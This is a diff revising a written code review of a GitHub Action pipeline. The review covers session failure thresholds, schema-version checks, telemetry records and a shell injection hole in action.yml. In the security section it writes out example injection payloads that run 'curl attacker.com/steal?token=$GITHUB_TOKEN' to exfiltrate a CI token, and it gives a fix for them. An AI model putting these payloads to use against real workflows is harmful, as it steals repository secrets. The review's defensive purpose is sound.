@@ -24,8 +24,8 @@ The architecture is materially stronger. Below is a detailed analysis of what re
 **`action.yml` `has_files()` heuristic unchanged.**
 The V1 review flagged that language detection via `find ... -print -quit` (lines 140-144) produces false positives from vendored dependencies or stray type-definition files. This was not addressed. The recommendation remains: inspect manifest files (`package.json`, `setup.py`, `go.mod`, `Cargo.toml`) as the primary signal, falling back to file-extension scanning only when no manifest is found.
 
-**`dispatch_devin.py` still lacks a failure threshold.**
-When session creation fails (lines 365-385), errors are appended to the sessions list and the loop continues. The `sessions_failed` count is computed internally but not exposed as an action output. If 80% of sessions fail, the workflow still reports success. Expose `sessions_failed` as an output in `action.yml` and consider adding a configurable `max_failure_rate` input (default 50%) that causes the step to exit non-zero when exceeded. This gives downstream consumers (e.g., Slack notifications, CI gates) a signal to react.
+**`dispatch_devin.py` lacks a failure threshold.**
+When session creation fails, errors are appended to the sessions list and the loop continues. The `sessions_failed` count is now computed and exposed as an action output (line 529 of `dispatch_devin.py`, line 70 of `action.yml`), which is an improvement. However, the workflow step still exits with code 0 regardless of how many sessions fail. If 80% of sessions fail, the workflow reports success. Consider adding a configurable `max_failure_rate` input (default 50%) that causes the step to exit non-zero when exceeded. This gives downstream consumers (e.g., Slack notifications, CI gates) a clear failure signal without requiring them to parse outputs.
 
 **`persist_telemetry.py` builds records with inconsistent field presence.**
 `build_telemetry_record()` (lines 75-130) conditionally includes `issue_fingerprints` only when issues exist, but `severity_breakdown` and `category_breakdown` are always present (possibly empty dicts). Consumers (like `aggregation.py`) must handle both missing and empty cases. Normalize to always include all fields with sensible defaults (empty list for fingerprints, empty dict for breakdowns) to simplify downstream code.
@@ -44,7 +44,7 @@ The test suite is now comprehensive for the core pipeline (727 lines for `parse_
 
 ### 1.3 Data Flow Contracts
 
-The V1 review recommended schema contracts between pipeline stages. The candidate added `ISSUES_SCHEMA_VERSION` and `BATCHES_SCHEMA_VERSION` constants and writes them into output files. However, `dispatch_devin.py` does not actually validate the version when reading `batches.json`. The version field is written but never checked. Add a guard at the top of `dispatch_devin.py`'s `main()` that verifies the schema version matches the expected value and fails with a clear error message if not.
+The V1 review recommended schema contracts between pipeline stages. The candidate added `ISSUES_SCHEMA_VERSION` and `BATCHES_SCHEMA_VERSION` constants and writes them into output files. `dispatch_devin.py` now checks the version at lines 392-398 and prints a warning on mismatch. However, the check only logs a warning and continues processing -- it does not fail. A version mismatch indicates a potentially incompatible data format, so the check should be a hard failure (raise `SystemExit`) rather than a soft warning. Additionally, `persist_telemetry.py` imports `ISSUES_SCHEMA_VERSION` but does not validate it when reading `issues.json`, creating an asymmetry.
 
 ---
 
@@ -62,10 +62,9 @@ The candidate addressed the most critical V1 security findings:
 ### 2.2 Remaining Vulnerabilities
 
 **`action.yml` shell injection vector is still present.**
-`${{ inputs.target_repo }}` is interpolated directly into shell commands at lines 114-123 (the `git clone` step). While `validate_repo_url()` in `dispatch_devin.py` performs a regex check, the `action.yml` clone step runs *before* any Python validation. A crafted `target_repo` value like `https://github.com/owner/repo; curl attacker.com/steal?token=$GITHUB_TOKEN` could execute arbitrary commands. The fix is straightforward:
-1. Set `target_repo` to an environment variable: `env: TARGET_REPO: ${{ inputs.target_repo }}`
-2. Use the env var in the shell: `git clone "$TARGET_REPO"` (quoted)
-3. Add `--` before the URL to prevent option injection: `git clone -- "$TARGET_REPO"`
+`${{ inputs.target_repo }}` is interpolated directly into a shell variable assignment at line 102 of `action.yml` (the "Normalize target repo URL" step): `RAW="${{ inputs.target_repo }}"`. Although the value is double-quoted, the GitHub Actions expression expansion happens *before* the shell interprets the line, meaning a payload containing `"; curl attacker.com/steal?token=$GITHUB_TOKEN; echo "` would break out of the quotes. The subsequent fork and clone steps correctly use environment variables (`TARGET_REPO: ${{ steps.normalize.outputs.target_repo }}`), but the initial normalization step is the injection point. The fix:
+1. Pass the raw input via an environment variable: `env: RAW_INPUT: ${{ inputs.target_repo }}`
+2. Reference it in the shell: `RAW="$RAW_INPUT"`
 
 This is a high-severity issue because action inputs are user-controlled.
 
@@ -335,7 +334,7 @@ For a candidate product, this is aspirational but worth mentioning in the README
 | `action.yml` shell injection | **Not Done** | `${{ inputs.target_repo }}` still in shell commands |
 | Structured logging | **Not Done** | Still using `print()` statements |
 | `action.yml` language detection | **Not Done** | Still uses file-extension heuristic |
-| `dispatch_devin.py` failure threshold | **Not Done** | No exposed `sessions_failed` output |
+| `dispatch_devin.py` failure threshold | **Partially Fixed** | `sessions_failed` exposed as output, but no hard failure on high failure rate |
 | `telemetry/app.py` tests | **Not Done** | Zero test coverage for Flask app |
 
 ---
